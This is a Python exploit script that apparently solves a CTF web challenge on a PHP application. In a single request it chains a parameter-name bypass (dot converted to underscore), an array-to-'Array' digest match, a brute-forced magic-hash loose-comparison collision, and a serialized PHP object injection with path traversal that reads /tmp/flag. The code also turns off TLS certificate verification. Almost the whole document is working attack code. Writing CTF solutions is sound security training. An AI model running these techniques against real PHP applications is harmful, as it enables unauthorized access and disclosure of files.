#!/usr/bin/env python3
"""
FortID CTF 2026 - web/ultimative-php : one-request exploit.

Four checks must pass in a single request:
  1. access_level=administrator   -- blocked in the raw query, bypassed by PHP's
     conversion of '.' to '_' in $_GET keys ("access.level" -> $_GET['access_level']).
  2. two same-type, different recovery answers whose SHA-256 of
     "legacy-recovery:v1:<value>" match -- both sent as arrays; PHP renders an
     array as the string "Array" during concatenation, so the digests match.
  3. code whose MD5[:9] and SHA-256[:9] are both "0e"+7 digits -- the classic PHP
     numeric-string loose comparison (0 == 0) with !== string inequality.
  4. profile=base64url(PHP serialized MigratedProfile) whose displayName is a
     LegacyTemplate with template="../../../../tmp/flag". Its __toString does
     `if (strpos($this->template, '../'))` -- strpos returns 0 (falsy) when the
     traversal starts at offset 0, so the filter is skipped and /tmp/flag is read.

Usage:
  ./solve.py <host> [port]            # port defaults to 443 (https)
  CHAL_HOST=... CHAL_PORT=... ./solve.py
  ./solve.py <host> --brute           # re-derive the collision code from scratch
"""
import base64
import http.client
import os
import re
import ssl
import sys

PREFIX = b"ULTIMATIVE-PHP-2026:"
KNOWN_CODE = "c68218860"  # first code with md5[:9] and sha256[:9] both 0e+7 digits


def _brute_worker(args):
    """Search one residue class for the collision code (module level so it pickles)."""
    import hashlib
    import itertools

    start, step = args
    for i in itertools.count(start, step):
        material = PREFIX + b"c%d" % i
        md5 = hashlib.md5(material).hexdigest()[:9]
        if not (md5.startswith("0e") and md5[2:].isdigit()):
            continue
        sha = hashlib.sha256(material).hexdigest()[:9]
        if sha.startswith("0e") and sha[2:].isdigit():
            return "c%d" % i
    return None


def recover_code() -> str:
    """Brute force a code where md5[:9] and sha256[:9] are both ^0e[0-9]{7}$."""
    from multiprocessing import Pool

    nproc = os.cpu_count() or 4
    with Pool(nproc) as pool:
        for res in pool.imap_unordered(_brute_worker, [(i, nproc) for i in range(nproc)]):
            if res:
                pool.terminate()
                return res
    raise RuntimeError("no collision found")


def build_profile(template: str = "../../../../tmp/flag") -> str:
    """PHP serialize MigratedProfile{displayName: LegacyTemplate{template}} -> base64url."""
    inner = 'O:14:"LegacyTemplate":1:{s:8:"template";s:%d:"%s";}' % (len(template), template)
    payload = 'O:15:"MigratedProfile":1:{s:11:"displayName";%s}' % inner
    return base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")


def fetch_flag(host: str, port: int, code: str) -> str:
    # access.level: raw query never contains "access_level"; PHP maps '.' -> '_' in $_GET keys
    # primary/backup arrays: "Array" == "Array" after the concat-based digest
    query = (
        "access.level=administrator"
        "&primary[]=one&backup[]=two"
        "&code=" + code +
        "&profile=" + build_profile()
    )
    ctx = ssl._create_unverified_context()
    if port == 443:
        conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=30)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=30)
    conn.request("GET", "/?" + query)
    body = conn.getresponse().read().decode("utf-8", "replace")
    m = re.search(r'<p class="flag">([^<]*)</p>', body)
    if m:
        return m.group(1)
    err = re.search(r'<p class="error">([^<]*)</p>', body)
    raise SystemExit("no flag (rejected: %s)" % (err.group(1) if err else body[:200]))


def main() -> None:
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    brute = "--brute" in sys.argv
    host = args[0] if args else os.environ.get("CHAL_HOST", "")
    port = int(args[1] if len(args) > 1 else os.environ.get("CHAL_PORT", "443"))
    if not host:
        raise SystemExit(__doc__)
    code = recover_code() if brute else KNOWN_CODE
    print("[*] compatibility code: %s" % code)
    print("[*] profile: %s" % build_profile())
    print("[*] target: %s:%d" % (host, port))
    flag = fetch_flag(host, port, code)
    print(flag)


if __name__ == "__main__":
    main()
